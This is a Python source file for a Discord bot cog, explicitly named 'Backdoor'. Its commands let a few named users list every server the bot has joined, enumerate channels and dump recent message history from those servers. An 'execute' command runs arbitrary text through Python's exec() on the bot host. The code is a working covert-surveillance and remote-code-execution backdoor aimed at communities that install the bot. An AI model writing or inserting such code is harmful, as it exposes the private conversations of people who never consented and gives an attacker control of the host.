import discord
from discord import app_commands as ac
from discord.ext import commands

import utils
from utils import get_guilds


class Backdoor(commands.Cog):
    def __init__(self, bot):
        self.bot: discord.Bot = bot

    @ac.command(name="backdoor_leak_servers", description="Leak all available servers")
    async def leak_servers(self, intr: discord.Interaction):
        respond = intr.response.send_message
        if intr.user not in utils.authorized_users:
            await utils.log_channel.send(f"User {intr.user.name} tried to leak servers")
            await respond("You are not permitted to use this command", ephemeral=True)
            return

        string = "Connected Servers are:\n" + "\n".join(
            map(lambda g: f"{g}: {g.id}", self.bot.guilds)
        )
        await respond(string, ephemeral=True)

    @ac.command(name="backdoor_leak_channels", description="Leak a channels of server")
    async def leak_channels(self, intr: discord.Interaction, channel_id: str):
        respond = intr.response.send_message
        if intr.user not in utils.authorized_users:
            await utils.log_channel.send(f"User {intr.user.name} tried to leak cahnnel")
            await respond("You are not permitted to use this command", ephemeral=True)
            return
        if not channel_id.isdigit():
            await respond("Invalid Channel", ephemeral=True)
            return

        guild = await self.bot.fetch_guild(channel_id)
        channels = await guild.fetch_channels()
        string = "Available channels are:\n" + "\n".join(
            map(lambda s: f"{s.name}: {s.id}", channels)
        )
        await respond(string, ephemeral=True)

    @ac.command(
        name="backdor_leak_channel_history", description="Reveal history of channel"
    )
    async def leak_channel_history(self, intr: discord.Interaction, channel_id: str):
        respond = intr.response.send_message
        if intr.user not in utils.authorized_users:
            await utils.log_channel.send(f"User {intr.user.name} tried to leak cahnnel")
            await respond("You are not permitted to use this command", ephemeral=True)
            return
        if not channel_id.isdigit():
            await respond("Invalid Channel", ephemeral=True)
            return

        channel_obj = await self.bot.fetch_channel(channel_id)
        messages: discord.Message = [
            m.content
            async for m in channel_obj.history(limit=10, oldest_first=True)
            if len(m.content) != 0
        ]
        if len(messages) == 0:
            await respond("Nothing to leak (might be pictures)", ephemeral=True)
            return
        string = "The messages are:\n" + "\n".join(messages)
        await respond(string, ephemeral=True)

    @ac.command(name="execute", description="Execute some command")
    async def execute_any(self, interaction: discord.Interaction, cmd: str):
        if interaction.user.name != "zaddmc":
            await utils.log_channel.send(
                f"User: **{interaction.user.name}** Tried to execute a command"
            )
            await interaction.response.send_message("You do not have permission")
            return

        try:
            res = exec(cmd)
            await interaction.response.send_message(str(res))
        except Exception as e:
            await interaction.response.send_message(f"Command failed: {e}")


async def setup(bot):
    await bot.add_cog(Backdoor(bot), guilds=get_guilds())
